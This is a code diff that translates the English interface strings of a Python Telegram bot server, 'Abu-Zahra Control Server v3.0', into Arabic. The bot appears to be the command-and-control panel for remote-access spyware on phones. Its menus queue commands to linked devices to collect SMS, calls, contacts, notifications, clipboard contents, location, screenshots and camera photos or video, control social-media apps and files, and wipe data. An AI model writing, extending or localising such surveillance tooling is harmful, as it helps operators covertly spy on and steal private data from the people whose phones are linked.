@@ -726,23 +726,23 @@ def ib(text, callback_data):
 def build_main_menu():
     return {
         "inline_keyboard": [
-            [ib("📱 Devices & Link", "menu_devices")],
-            [ib("📊 Data Collection", "menu_data")],
-            [ib("🌐 Social Media", "menu_social")],
-            [ib("🎮 Remote Control", "menu_control")],
-            [ib("📦 App Management", "menu_apps")],
-            [ib("📂 File Management", "menu_files")],
-            [ib("🔒 Security & Admin", "menu_security")],
-            [ib("🔍 Monitoring", "menu_monitor")],
-            [ib("⚙️ System Settings", "menu_syssettings")],
-            [ib("🖥️ Server Management", "menu_server")],
-            [ib("⁉️ Help", "menu_help")],
+            [ib("📱 الأجهزة والربط", "menu_devices")],
+            [ib("📊 جمع البيانات", "menu_data")],
+            [ib("🌐 التواصل الاجتماعي", "menu_social")],
+            [ib("🎮 التحكم عن بعد", "menu_control")],
+            [ib("📦 إدارة التطبيقات", "menu_apps")],
+            [ib("📂 إدارة الملفات", "menu_files")],
+            [ib("🔒 الأمان والإدارة", "menu_security")],
+            [ib("🔍 المراقبة", "menu_monitor")],
+            [ib("⚙️ إعدادات النظام", "menu_syssettings")],
+            [ib("🖥️ إدارة السيرفر", "menu_server")],
+            [ib("⁉️ المساعدة", "menu_help")],
         ]
     }
 
 
 def build_back_button(target="back_main"):
-    return {"inline_keyboard": [[ib("🔙 Back", target)]]}
+    return {"inline_keyboard": [[ib("🔙 رجوع", target)]]}
 
 
 def build_devices_menu():
@@ -750,32 +750,32 @@ def build_devices_menu():
     rows = []
     for d in devices:
         status = "🟢" if d.get("active") else "🔴"
-        name = d.get("name", d.get("id", "Unknown"))
+        name = d.get("name", d.get("id", "مجهول"))
         rows.append([ib(f"{status} {name}", f"dev_{d['id']}")])
     if not devices:
-        rows.append([ib("No devices linked", "no_action")])
-    rows.append([ib("🔗 Link New Device", "do_link")])
-    rows.append([ib("🔙 Back", "back_main")])
+        rows.append([ib("لا توجد أجهزة مربوطة", "no_action")])
+    rows.append([ib("🔗 ربط جهاز جديد", "do_link")])
+    rows.append([ib("🔙 رجوع", "back_main")])
     return {"inline_keyboard": rows}
 
 
 def build_device_menu(device_id):
     return {
         "inline_keyboard": [
-            [ib("ℹ️ Device Info", f"cmd_info_{device_id}")],
-            [ib("🔋 Battery", f"cmd_battery_{device_id}"), ib("📍 Location", f"cmd_location_{device_id}")],
-            [ib("📲 SMS", f"cmd_sms_{device_id}"), ib("📞 Calls", f"cmd_calls_{device_id}")],
-            [ib("📇 Contacts", f"cmd_contacts_{device_id}"), ib("🔔 Notifications", f"cmd_notifications_{device_id}")],
-            [ib("📸 Screenshot", f"cmd_screenshot_{device_id}"), ib("📷 Camera", f"submenu_camera_{device_id}")],
-            [ib("📋 Clipboard", f"cmd_clipboard_{device_id}"), ib("📱 Apps", f"cmd_apps_{device_id}")],
-            [ib("🌐 Social", f"submenu_social_{device_id}")],
-            [ib("🎮 Control", f"submenu_control_{device_id}")],
-            [ib("📂 Files", f"submenu_files_{device_id}")],
-            [ib("🔒 Security", f"submenu_security_{device_id}")],
-            [ib("🔍 Monitor", f"submenu_monitor_{device_id}")],
-            [ib("⚙️ Settings", f"submenu_syssettings_{device_id}")],
-            [ib("🗑️ Unlink", f"do_unlink_{device_id}")],
-            [ib("🔙 Back", "menu_devices")],
+            [ib("ℹ️ معلومات الجهاز", f"cmd_info_{device_id}")],
+            [ib("🔋 البطارية", f"cmd_battery_{device_id}"), ib("📍 الموقع", f"cmd_location_{device_id}")],
+            [ib("📲 الرسائل", f"cmd_sms_{device_id}"), ib("📞 المكالمات", f"cmd_calls_{device_id}")],
+            [ib("📇 جهات الاتصال", f"cmd_contacts_{device_id}"), ib("🔔 الإشعارات", f"cmd_notifications_{device_id}")],
+            [ib("📸 لقطة الشاشة", f"cmd_screenshot_{device_id}"), ib("📷 الكاميرا", f"submenu_camera_{device_id}")],
+            [ib("📋 الحافظة", f"cmd_clipboard_{device_id}"), ib("📱 التطبيقات", f"cmd_apps_{device_id}")],
+            [ib("🌐 التواصل", f"submenu_social_{device_id}")],
+            [ib("🎮 التحكم", f"submenu_control_{device_id}")],
+            [ib("📂 الملفات", f"submenu_files_{device_id}")],
+            [ib("🔒 الأمان", f"submenu_security_{device_id}")],
+            [ib("🔍 المراقبة", f"submenu_monitor_{device_id}")],
+            [ib("⚙️ الإعدادات", f"submenu_syssettings_{device_id}")],
+            [ib("🗑️ إلغاء الربط", f"do_unlink_{device_id}")],
+            [ib("🔙 رجوع", "menu_devices")],
         ]
     }
 
@@ -803,7 +803,7 @@ def build_category_submenu(device_id, category):
     for name, info in items:
         rows.append([ib(info["desc"], f"exec_{name}_{device_id}")])
     
-    rows.append([ib("🔙 Back", f"dev_{device_id}")])
+    rows.append([ib("🔙 رجوع", f"dev_{device_id}")])
     return {"inline_keyboard": rows}
 
 
@@ -842,20 +842,20 @@ def build_syssettings_submenu(device_id):
 def build_server_menu():
     return {
         "inline_keyboard": [
-            [ib("📊 Server Status", "srv_status")],
-            [ib("📈 Statistics", "srv_stats")],
-            [ib("📝 Event Logs", "srv_logs")],
-            [ib("⚙️ Settings", "srv_settings")],
-            [ib("🔑 Set Password", "srv_setpass")],
-            [ib("➕ Add Admin", "srv_addadmin")],
-            [ib("📢 Broadcast", "srv_broadcast")],
-            [ib("💾 Backup", "srv_backup")],
-            [ib("📤 Export", "srv_export")],
-            [ib("📥 Import", "srv_import")],
-            [ib("🗑️ Clear Data", "srv_cleardata")],
-            [ib("🔄 Restart", "srv_restart")],
-            [ib("🔧 Maintenance", "srv_maintenance")],
-            [ib("🔙 Back", "back_main")],
+            [ib("📊 حالة السيرفر", "srv_status")],
+            [ib("📈 الإحصائيات", "srv_stats")],
+            [ib("📝 سجل الأحداث", "srv_logs")],
+            [ib("⚙️ الإعدادات", "srv_settings")],
+            [ib("🔑 تغيير كلمة المرور", "srv_setpass")],
+            [ib("➕ إضافة أدمن", "srv_addadmin")],
+            [ib("📢 إرسال عام", "srv_broadcast")],
+            [ib("💾 نسخ احتياطي", "srv_backup")],
+            [ib("📤 تصدير", "srv_export")],
+            [ib("📥 استيراد", "srv_import")],
+            [ib("🗑️ مسح البيانات", "srv_cleardata")],
+            [ib("🔄 إعادة تشغيل", "srv_restart")],
+            [ib("🔧 الصيانة", "srv_maintenance")],
+            [ib("🔙 رجوع", "back_main")],
         ]
     }
 
@@ -869,12 +869,12 @@ def build_help_menu():
             cats[cat] = []
         cats[cat].append(info)
     
-    text = f"📖 <b>Command Guide - Abu Zahra</b>\n\nTotal: <b>{total}</b> commands\n\n"
+    text = f"📖 <b>دليل الأوامر - أبو الزهراء</b>\n\nالإجمالي: <b>{total}</b> أوامر\n\n"
     cat_names = {
-        "data": "📊 Data Collection", "social": "🌐 Social Media",
-        "control": "🎮 Remote Control", "apps": "📦 App Management",
-        "files": "📂 File Management", "security": "🔒 Security",
-        "monitor": "🔍 Monitoring", "syssettings": "⚙️ System Settings",
+        "data": "📊 جمع البيانات", "social": "🌐 التواصل الاجتماعي",
+        "control": "🎮 التحكم عن بعد", "apps": "📦 إدارة التطبيقات",
+        "files": "📂 إدارة الملفات", "security": "🔒 الأمان",
+        "monitor": "🔍 المراقبة", "syssettings": "⚙️ إعدادات النظام",
     }
     for cat, items in cats.items():
         text += f"<b>{cat_names.get(cat, cat)}</b> ({len(items)}):\n"
@@ -884,8 +884,8 @@ def build_help_menu():
             text += f"  ...+{len(items)-3} more\n"
         text += "\n"
     
-    text += "📱 /devices - Device list\n🔗 /link - Link device\n"
-    text += "📋 /menu - Main menu\n📊 /status - Status\n"
+    text += "📱 /devices - قائمة الأجهزة\n🔗 /link - ربط جهاز\n"
+    text += "📋 /menu - القائمة الرئيسية\n📊 /status - الحالة\n"
     return text
 
 # ============================================================================
@@ -895,12 +895,12 @@ def build_help_menu():
 async def execute_device_command(chat_id, device_id, cmd_name, params=None, msg_id=None):
     """Queue a command for a device and notify admin."""
     if not device_id or device_id == "none":
-        await send_message(chat_id, "❌ No device selected. Use /link first.", reply_markup=build_main_menu())
+        await send_message(chat_id, "❌ لم يتم اختيار جهاز. استخدم /link أولاً.", reply_markup=build_main_menu())
         return
     
     d = find_device(device_id)
     if not d:
-        await send_message(chat_id, f"❌ Device <code>{device_id}</code> not found.", reply_markup=build_main_menu())
+        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود.", reply_markup=build_main_menu())
         return
     
     cmd = queue_command(device_id, cmd_name, params)
@@ -909,11 +909,11 @@ async def execute_device_command(chat_id, device_id, cmd_name, params=None, msg_
     emoji = reg.get("emoji", "📋")
     
     text = (
-        f"{emoji} <b>Command Sent</b>\n\n"
-        f"📱 Device: <code>{d.get('name', device_id)}</code>\n"
-        f"📋 Command: <code>{cmd_name}</code>\n"
-        f"🆔 ID: <code>{cmd['id']}</code>\n\n"
-        f"⏳ Waiting for device response..."
+        f"{emoji} <b>تم إرسال الأمر</b>\n\n"
+        f"📱 الجهاز: <code>{d.get('name', device_id)}</code>\n"
+        f"📋 الأمر: <code>{cmd_name}</code>\n"
+        f"🆔 المعرف: <code>{cmd['id']}</code>\n\n"
+        f"⏳ بانتظار استجابة الجهاز..."
     )
     
     kb = build_device_menu(device_id)
@@ -958,22 +958,22 @@ async def handle_telegram_command(chat_id, text, message_id=None):
         text = build_help_menu()
         await send_message(chat_id, text, reply_markup=build_back_button())
     elif cmd == "/menu":
-        await send_message(chat_id, "📋 <b>Main Menu</b>\nSelect a category:", reply_markup=build_main_menu())
+        await send_message(chat_id, "📋 <b>القائمة الرئيسية</b>\nاختر تصنيفاً:", reply_markup=build_main_menu())
     elif cmd == "/status":
         await handle_status(chat_id)
     elif cmd == "/about":
         await send_message(chat_id, (
-            "🟥 <b>Abu-Zahra Server v3.0</b>\n\n"
-            "Complete Device Management System\n"
-            f"Domain: <code>{SERVER_DOMAIN}</code>\n"
-            f"Port: <code>{SERVER_PORT}</code>\n"
-            f"Commands: <code>{len(COMMAND_REGISTRY)}</code>\n"
-            f"Uptime: <code>{format_uptime(get_uptime())}</code>"
+            "🟥 <b>سيرفر أبو الزهراء v3.0</b>\n\n"
+            "نظام إدارة الأجهزة المتكامل\n"
+            f"النطاق: <code>{SERVER_DOMAIN}</code>\n"
+            f"المنفذ: <code>{SERVER_PORT}</code>\n"
+            f"الأوامر: <code>{len(COMMAND_REGISTRY)}</code>\n"
+            f"وقت التشغيل: <code>{format_uptime(get_uptime())}</code>"
         ), reply_markup=build_back_button())
     elif cmd == "/version":
-        await send_message(chat_id, "🟥 <b>Abu-Zahra v3.0</b>\nBuild: 2025.01\nCommands: 200+\nEngine: aiohttp", reply_markup=build_back_button())
+        await send_message(chat_id, "🟥 <b>أبو الزهراء v3.0</b>\nالإصدار: 2025.01\nالأوامر: 200+\nالمحرك: aiohttp", reply_markup=build_back_button())
     elif cmd == "/test":
-        await send_message(chat_id, "✅ Server is running!\n🟢 All systems operational.", reply_markup=build_back_button())
+        await send_message(chat_id, "✅ السيرفر يعمل!\n🟢 جميع الأنظمة تعمل.", reply_markup=build_back_button())
 
     # ── Device Management ──
     elif cmd == "/devices":
@@ -987,11 +987,11 @@ async def handle_telegram_command(chat_id, text, message_id=None):
     elif cmd == "/device_rename":
         if arg1 and arg2:
             if update_device(arg1, {"name": arg2}):
-                await send_message(chat_id, f"✅ Device renamed to <code>{arg2}</code>", reply_markup=build_back_button())
+                await send_message(chat_id, f"✅ تم إعادة تسمية الجهاز إلى <code>{arg2}</code>", reply_markup=build_back_button())
             else:
-                await send_message(chat_id, "❌ Device not found", reply_markup=build_back_button())
+                await send_message(chat_id, "❌ الجهاز غير موجود", reply_markup=build_back_button())
         else:
-            await send_message(chat_id, "Usage: /device_rename device_id new_name", reply_markup=build_back_button())
+            await send_message(chat_id, "الاستخدام: /device_rename معرف_الجهاز الاسم_الجديد", reply_markup=build_back_button())
     elif cmd == "/device_wipe":
         await execute_device_command(chat_id, dev_id, "wipe_data")
     elif cmd == "/device_locate":
@@ -1003,27 +1003,27 @@ async def handle_telegram_command(chat_id, text, message_id=None):
     elif cmd == "/device_settings":
         d = find_device(dev_id)
         if d:
-            await send_message(chat_id, f"⚙️ Settings for <code>{d.get('name', dev_id)}</code>:\n{json.dumps(d, ensure_ascii=False, indent=2)[:2000]}", reply_markup=build_back_button())
+            await send_message(chat_id, f"⚙️ الإعدادات لجهاز <code>{d.get('name', dev_id)}</code>:\n{json.dumps(d, ensure_ascii=False, indent=2)[:2000]}", reply_markup=build_back_button())
         else:
-            await send_message(chat_id, "❌ Device not found", reply_markup=build_back_button())
+            await send_message(chat_id, "❌ الجهاز غير موجود", reply_markup=build_back_button())
 
     # ── Server Management ──
     elif cmd == "/server_status":
         await handle_status(chat_id)
     elif cmd == "/server_restart":
-        await send_admin("🔄 Server restart requested...")
+        await send_admin("🔄 تم طلب إعادة تشغيل السيرفر...")
         append_event("Server restart requested")
     elif cmd == "/clear_data":
         save_json(COMMANDS_FILE, [])
         save_json(EVENTS_FILE, [])
-        await send_admin("✅ Command queue and events cleared", reply_markup=build_back_button())
+        await send_admin("✅ تم مسح قائمة الأوامر والأحداث", reply_markup=build_back_button())
     elif cmd == "/backup":
-        await send_admin("💾 Creating backup...", reply_markup=build_back_button())
+        await send_admin("💾 جارٍ إنشاء نسخة احتياطية...", reply_markup=build_back_button())
         append_event("Backup created")
     elif cmd == "/export":
-        await send_admin("📤 Export started", reply_markup=build_back_button())
+        await send_admin("📤 بدأ التصدير", reply_markup=build_back_button())
     elif cmd == "/import":
-        await send_admin("📥 Import ready", reply_markup=build_back_button())
+        await send_admin("📥 جاهز للاستيراد", reply_markup=build_back_button())
     elif cmd == "/stats":
         devices = get_devices()
         online = sum(1 for d in devices if d.get("active"))
@@ -1031,54 +1031,54 @@ async def handle_telegram_command(chat_id, text, message_id=None):
         pending = sum(1 for c in cmds if c.get("status") == "pending")
         done = sum(1 for c in cmds if c.get("status") == "completed")
         text = (
-            "📈 <b>Statistics</b>\n\n"
-            f"📱 Devices: {len(devices)} (🟢 {online})\n"
-            f"📋 Total Commands: {len(cmds)}\n"
-            f"⏳ Pending: {pending}\n"
-            f"✅ Completed: {done}\n"
-            f"📨 Messages Sent: {messages_sent}\n"
-            f"📡 API Hits: {api_hits}\n"
-            f"⏱️ Uptime: {format_uptime(get_uptime())}"
+            "📈 <b>الإحصائيات</b>\n\n"
+            f"📱 الأجهزة: {len(devices)} (🟢 {online})\n"
+            f"📋 إجمالي الأوامر: {len(cmds)}\n"
+            f"⏳ معلّق: {pending}\n"
+            f"✅ مكتمل: {done}\n"
+            f"📨 الرسائل المرسلة: {messages_sent}\n"
+            f"📡 طلبات API: {api_hits}\n"
+            f"⏱️ وقت التشغيل: {format_uptime(get_uptime())}"
         )
         await send_message(chat_id, text, reply_markup=build_back_button())
     elif cmd == "/logs":
         events = load_json(EVENTS_FILE, [])[-20:]
-        text = "📝 <b>Recent Logs</b>\n\n"
+        text = "📝 <b>السجلات الأخيرة</b>\n\n"
         for e in events:
             text += f"[{e.get('time','')}] {e.get('event','')}\n"
         await send_message(chat_id, text[:4000], reply_markup=build_back_button())
     elif cmd == "/clear_logs":
         save_json(EVENTS_FILE, [])
-        await send_admin("✅ Logs cleared", reply_markup=build_back_button())
+        await send_admin("✅ تم مسح السجلات", reply_markup=build_back_button())
     elif cmd == "/settings":
         s = load_settings()
-        await send_message(chat_id, f"⚙️ <b>Settings</b>\n\n<code>{json.dumps(s, ensure_ascii=False, indent=2)}</code>", reply_markup=build_back_button())
+        await send_message(chat_id, f"⚙️ <b>الإعدادات</b>\n\n<code>{json.dumps(s, ensure_ascii=False, indent=2)}</code>", reply_markup=build_back_button())
     elif cmd == "/set_password":
         if arg1:
             s = load_settings()
             s["admin_password"] = arg1
             save_settings_data(s)
-            await send_admin("✅ Password changed", reply_markup=build_back_button())
+            await send_admin("✅ تم تغيير كلمة المرور", reply_markup=build_back_button())
         else:
-            await send_admin("Usage: /set_password new_password", reply_markup=build_back_button())
+            await send_admin("الاستخدام: /set_password كلمة_المرور_الجديدة", reply_markup=build_back_button())
     elif cmd == "/add_admin":
-        await send_admin("Use /set_password to change admin password", reply_markup=build_back_button())
+        await send_admin("استخدم /set_password لتغيير كلمة مرور الأدمن", reply_markup=build_back_button())
     elif cmd == "/remove_admin":
-        await send_admin("Feature not available in single-admin mode", reply_markup=build_back_button())
+        await send_admin("الميزة غير متاحة في وضع الأدمن الواحد", reply_markup=build_back_button())
     elif cmd == "/broadcast":
-        await send_admin("No other users to broadcast to", reply_markup=build_back_button())
+        await send_admin("لا يوجد مستخدمون آخرون للإرسال", reply_markup=build_back_button())
     elif cmd == "/maintenance":
         s = load_settings()
         s["maintenance"] = not s.get("maintenance", False)
         save_settings_data(s)
-        state = "ON 🔧" if s["maintenance"] else "OFF ✅"
-        await send_admin(f"🔧 Maintenance mode: {state}", reply_markup=build_back_button())
+        state = "مفعّل 🔧" if s["maintenance"] else "معطّل ✅"
+        await send_admin(f"🔧 وضع الصيانة: {state}", reply_markup=build_back_button())
     elif cmd == "/export_data":
-        await send_admin("📤 Data exported", reply_markup=build_back_button())
+        await send_admin("📤 تم تصدير البيانات", reply_markup=build_back_button())
     elif cmd == "/import_data":
-        await send_admin("📥 Ready for data import", reply_markup=build_back_button())
+        await send_admin("📥 جاهز لاستيراد البيانات", reply_markup=build_back_button())
     elif cmd == "/update_bot":
-        await send_admin("🟥 Bot is up to date (v3.0)", reply_markup=build_back_button())
+        await send_admin("🟥 البوت محدّث (v3.0)", reply_markup=build_back_button())
 
     # ── 200+ Device Commands from Registry ──
     elif cmd[1:] in COMMAND_REGISTRY:
@@ -1101,18 +1101,18 @@ async def handle_telegram_command(chat_id, text, message_id=None):
         else:
             await execute_device_command(chat_id, dev_id, reg["cmd"])
     else:
-        await send_message(chat_id, f"❓ Unknown command: <code>{cmd}</code>\nUse /help for command list.", reply_markup=build_back_button())
+        await send_message(chat_id, f"❓ أمر غير معروف: <code>{cmd}</code>\nاستخدم /help لعرض قائمة الأوامر.", reply_markup=build_back_button())
 
 
 async def handle_start(chat_id):
     text = (
-        "🟥 <b>Abu-Zahra Control Server</b>\n\n"
-        "Welcome to the management panel\n"
-        "Control all linked devices remotely\n\n"
-        f"🟢 Uptime: <code>{format_uptime(get_uptime())}</code>\n"
-        f"📱 Devices: <code>{len(get_devices())}</code>\n"
-        f"📡 Port: <code>{SERVER_PORT}</code>\n"
-        f"🌐 Domain: <code>{SERVER_DOMAIN}</code>"
+        "🟥 <b>سيرفر التحكم أبو الزهراء</b>\n\n"
+        "مرحباً بك في لوحة التحكم\n"
+        "تحكم بجميع الأجهزة المربوطة عن بعد\n\n"
+        f"🟢 وقت التشغيل: <code>{format_uptime(get_uptime())}</code>\n"
+        f"📱 الأجهزة: <code>{len(get_devices())}</code>\n"
+        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
+        f"🌐 النطاق: <code>{SERVER_DOMAIN}</code>"
     )
     await send_message(chat_id, text, reply_markup=build_main_menu())
 
@@ -1124,17 +1124,17 @@ async def handle_status(chat_id):
     pending = sum(1 for c in cmds if c.get("status") == "pending")
     events = load_json(EVENTS_FILE, [])
     text = (
-        "📊 <b>Server Status</b>\n\n"
-        f"🟢 Status: <code>Running</code>\n"
-        f"⏱️ Uptime: <code>{format_uptime(get_uptime())}</code>\n"
-        f"📡 Port: <code>{SERVER_PORT}</code>\n"
-        f"🕐 Time: <code>{ts()}</code>\n\n"
-        f"📱 Devices: <code>{len(devices)}</code> (🟢 {online} online)\n"
-        f"📨 Messages: <code>{messages_sent}</code>\n"
-        f"📡 API Hits: <code>{api_hits}</code>\n"
-        f"📋 Pending: <code>{pending}</code>\n"
-        f"📝 Events: <code>{len(events)}</code>\n"
-        f"📋 Total Commands: <code>{len(COMMAND_REGISTRY)}</code>"
+        "📊 <b>حالة السيرفر</b>\n\n"
+        f"🟢 الحالة: <code>يعمل</code>\n"
+        f"⏱️ وقت التشغيل: <code>{format_uptime(get_uptime())}</code>\n"
+        f"📡 المنفذ: <code>{SERVER_PORT}</code>\n"
+        f"🕐 الوقت: <code>{ts()}</code>\n\n"
+        f"📱 الأجهزة: <code>{len(devices)}</code> (🟢 {online} متصل)\n"
+        f"📨 الرسائل: <code>{messages_sent}</code>\n"
+        f"📡 طلبات API: <code>{api_hits}</code>\n"
+        f"📋 معلّق: <code>{pending}</code>\n"
+        f"📝 الأحداث: <code>{len(events)}</code>\n"
+        f"📋 إجمالي الأوامر: <code>{len(COMMAND_REGISTRY)}</code>"
     )
     await send_message(chat_id, text, reply_markup=build_back_button())
 
@@ -1142,13 +1142,13 @@ async def handle_status(chat_id):
 async def handle_devices(chat_id):
     devices = get_devices()
     if not devices:
-        await send_message(chat_id, "📱 No devices linked\nUse /link to add a device", reply_markup=build_back_button())
+        await send_message(chat_id, "📱 لا توجد أجهزة مربوطة\nاستخدم /link لإضافة جهاز", reply_markup=build_back_button())
         return
-    text = "📱 <b>Device List</b>\n\n"
+    text = "📱 <b>قائمة الأجهزة</b>\n\n"
     for d in devices:
-        status = "🟢 Online" if d.get("active") else "🔴 Offline"
-        name = d.get("name", d.get("model", "Unknown"))
-        text += f"{'─'*20}\n📱 <b>{name}</b>\n   ID: <code>{d['id']}</code>\n   Status: {status}\n   Last: <code>{d.get('last_seen','—')}</code>\n"
+        status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
+        name = d.get("name", d.get("model", "مجهول"))
+        text += f"{'─'*20}\n📱 <b>{name}</b>\n   المعرف: <code>{d['id']}</code>\n   الحالة: {status}\n   آخر ظهور: <code>{d.get('last_seen','—')}</code>\n"
     await send_message(chat_id, text, reply_markup=build_devices_menu())
 
 
@@ -1174,36 +1174,36 @@ async def handle_link(chat_id):
 
 async def handle_unlink(chat_id, device_id):
     if not device_id:
-        await send_message(chat_id, "Usage: /unlink device_id", reply_markup=build_back_button())
+        await send_message(chat_id, "الاستخدام: /unlink معرف_الجهاز", reply_markup=build_back_button())
         return
     if remove_device(device_id):
-        await send_message(chat_id, f"✅ Device <code>{device_id}</code> unlinked", reply_markup=build_devices_menu())
+        await send_message(chat_id, f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>", reply_markup=build_devices_menu())
     else:
-        await send_message(chat_id, f"❌ Device <code>{device_id}</code> not found", reply_markup=build_back_button())
+        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_button())
 
 
 async def handle_device_detail(chat_id, device_id):
     if not device_id:
-        await send_message(chat_id, "Usage: /device device_id", reply_markup=build_back_button())
+        await send_message(chat_id, "الاستخدام: /device معرف_الجهاز", reply_markup=build_back_button())
         return
     d = find_device(device_id)
     if not d:
-        await send_message(chat_id, f"❌ Device <code>{device_id}</code> not found", reply_markup=build_back_button())
+        await send_message(chat_id, f"❌ الجهاز <code>{device_id}</code> غير موجود", reply_markup=build_back_button())
         return
-    status = "🟢 Online" if d.get("active") else "🔴 Offline"
+    status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
     text = (
-        f"📱 <b>Device Details</b>\n\n"
+        f"📱 <b>تفاصيل الجهاز</b>\n\n"
         f"{'─'*20}\n"
-        f"📱 Name: <code>{d.get('name','—')}</code>\n"
-        f"🆔 ID: <code>{d['id']}</code>\n"
-        f"📊 Status: {status}\n"
-        f"📱 Model: <code>{d.get('model','—')}</code>\n"
-        f"🤖 OS: <code>{d.get('os','—')}</code>\n"
-        f"🔋 Battery: <code>{d.get('battery','—')}%</code>\n"
-        f"📶 Network: <code>{d.get('network','—')}</code>\n"
-        f"📍 Location: <code>{d.get('location','—')}</code>\n"
-        f"🕐 Last Seen: <code>{d.get('last_seen','—')}</code>\n"
-        f"📅 Registered: <code>{d.get('created_at','—')}</code>"
+        f"📱 الاسم: <code>{d.get('name','—')}</code>\n"
+        f"🆔 المعرف: <code>{d['id']}</code>\n"
+        f"📊 الحالة: {status}\n"
+        f"📱 الموديل: <code>{d.get('model','—')}</code>\n"
+        f"🤖 النظام: <code>{d.get('os','—')}</code>\n"
+        f"🔋 البطارية: <code>{d.get('battery','—')}%</code>\n"
+        f"📶 الشبكة: <code>{d.get('network','—')}</code>\n"
+        f"📍 الموقع: <code>{d.get('location','—')}</code>\n"
+        f"🕐 آخر ظهور: <code>{d.get('last_seen','—')}</code>\n"
+        f"📅 تاريخ التسجيل: <code>{d.get('created_at','—')}</code>"
     )
     await send_message(chat_id, text, reply_markup=build_device_menu(device_id))
 
@@ -1223,12 +1223,12 @@ async def handle_callback_query(callback):
     try:
         # ── Navigation ──
         if data == "back_main":
-            await edit_message_text(chat_id, message_id, "📋 <b>Main Menu</b>\nSelect:", reply_markup=build_main_menu())
+            await edit_message_text(chat_id, message_id, "📋 <b>القائمة الرئيسية</b>\nاختر:", reply_markup=build_main_menu())
             await answer_callback_query(cb_id)
             return
 
         if data == "menu_devices":
-            await edit_message_text(chat_id, message_id, "📱 <b>Devices</b>", reply_markup=build_devices_menu())
+            await edit_message_text(chat_id, message_id, "📱 <b>الأجهزة</b>", reply_markup=build_devices_menu())
             await answer_callback_query(cb_id)
             return
 
@@ -1239,12 +1239,12 @@ async def handle_callback_query(callback):
             return
 
         if data == "menu_server":
-            await edit_message_text(chat_id, message_id, "🖥️ <b>Server Management</b>", reply_markup=build_server_menu())
+            await edit_message_text(chat_id, message_id, "🖥️ <b>إدارة السيرفر</b>", reply_markup=build_server_menu())
             await answer_callback_query(cb_id)
             return
 
         if data == "no_action":
-            await answer_callback_query(cb_id, "No action")
+            await answer_callback_query(cb_id, "لا يوجد إجراء")
             return
 
         # ── Link ──
@@ -1271,10 +1271,10 @@ async def handle_callback_query(callback):
         if data.startswith("do_unlink_"):
             device_id = data.replace("do_unlink_", "")
             if remove_device(device_id):
-                text = f"✅ Device <code>{device_id}</code> unlinked"
+                text = f"✅ تم إلغاء ربط الجهاز <code>{device_id}</code>"
                 await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
             else:
-                await answer_callback_query(cb_id, "Failed", show_alert=True)
+                await answer_callback_query(cb_id, "فشل العملية", show_alert=True)
             await answer_callback_query(cb_id)
             return
 
@@ -1283,11 +1283,11 @@ async def handle_callback_query(callback):
             device_id = data[4:]
             d = find_device(device_id)
             if d:
-                status = "🟢 Online" if d.get("active") else "🔴 Offline"
-                text = f"📱 <b>{d.get('name', device_id)}</b>\n{status} | {d.get('model','—')}\n\nSelect action:"
+                status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
+                text = f"📱 <b>{d.get('name', device_id)}</b>\n{status} | {d.get('model','—')}\n\nاختر إجراء:"
                 await edit_message_text(chat_id, message_id, text, reply_markup=build_device_menu(device_id))
             else:
-                await answer_callback_query(cb_id, "Device not found", show_alert=True)
+                await answer_callback_query(cb_id, "الجهاز غير موجود", show_alert=True)
             return
 
         # ── Category Submenus ──
@@ -1323,7 +1323,7 @@ async def handle_callback_query(callback):
                 else:
                     kb = build_back_button()
                 cat_label = prefix.replace("submenu_", "").title()
-                await edit_message_text(chat_id, message_id, f"📂 <b>{cat_label} Commands</b>\nSelect command:", reply_markup=kb)
+                await edit_message_text(chat_id, message_id, f"📂 <b>{cat_label} - الأوامر</b>\nاختر أمراً:", reply_markup=kb)
                 await answer_callback_query(cb_id)
                 return
 
@@ -1332,13 +1332,13 @@ async def handle_callback_query(callback):
             device_id = data[len("submenu_camera_"):]
             kb = {
                 "inline_keyboard": [
-                    [ib("📷 Front Camera", f"exec_front_camera_{device_id}")],
-                    [ib("📷 Back Camera", f"exec_back_camera_{device_id}")],
-                    [ib("🎬 Record Video", f"exec_record_video_{device_id}")],
-                    [ib("🔙 Back", f"dev_{device_id}")],
+                    [ib("📷 كاميرا أمامية", f"exec_front_camera_{device_id}")],
+                    [ib("📷 كاميرا خلفية", f"exec_back_camera_{device_id}")],
+                    [ib("🎬 تسجيل فيديو", f"exec_record_video_{device_id}")],
+                    [ib("🔙 رجوع", f"dev_{device_id}")],
                 ]
             }
-            await edit_message_text(chat_id, message_id, "📷 <b>Camera</b>", reply_markup=kb)
+            await edit_message_text(chat_id, message_id, "📷 <b>الكاميرا</b>", reply_markup=kb)
             await answer_callback_query(cb_id)
             return
 
@@ -1351,9 +1351,9 @@ async def handle_callback_query(callback):
                 reg = COMMAND_REGISTRY.get(cmd_name)
                 if reg:
                     await execute_device_command(chat_id, device_id, reg["cmd"], msg_id=message_id)
-                    await answer_callback_query(cb_id, f"Command queued: {reg['desc']}")
+                    await answer_callback_query(cb_id, f"تم إرسال الأمر: {reg['desc']}")
                 else:
-                    await answer_callback_query(cb_id, "Unknown command", show_alert=True)
+                    await answer_callback_query(cb_id, "أمر غير معروف", show_alert=True)
                 return
 
         # ── Direct cmd_ buttons (from device menu) ──
@@ -1381,13 +1381,13 @@ async def handle_callback_query(callback):
             online = sum(1 for d in devices if d.get("active"))
             cmds = load_json(COMMANDS_FILE, [])
             pending = sum(1 for c in cmds if c.get("status") == "pending")
-            text = f"📈 Stats: {len(devices)} devices ({online} online), {pending} pending cmds, {messages_sent} msgs sent"
+            text = f"📈 الإحصائيات: {len(devices)} أجهزة ({online} متصل), {pending} أوامر معلّقة, {messages_sent} رسالة مرسلة"
             await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
             await answer_callback_query(cb_id)
             return
         if data == "srv_logs":
             events = load_json(EVENTS_FILE, [])[-15:]
-            text = "📝 <b>Recent Logs</b>\n\n"
+            text = "📝 <b>السجلات الأخيرة</b>\n\n"
             for e in events:
                 text += f"[{e.get('time','')[:16]}] {e.get('event','')}\n"
             await edit_message_text(chat_id, message_id, text[:4000], reply_markup=build_server_menu())
@@ -1395,18 +1395,18 @@ async def handle_callback_query(callback):
             return
         if data == "srv_settings":
             s = load_settings()
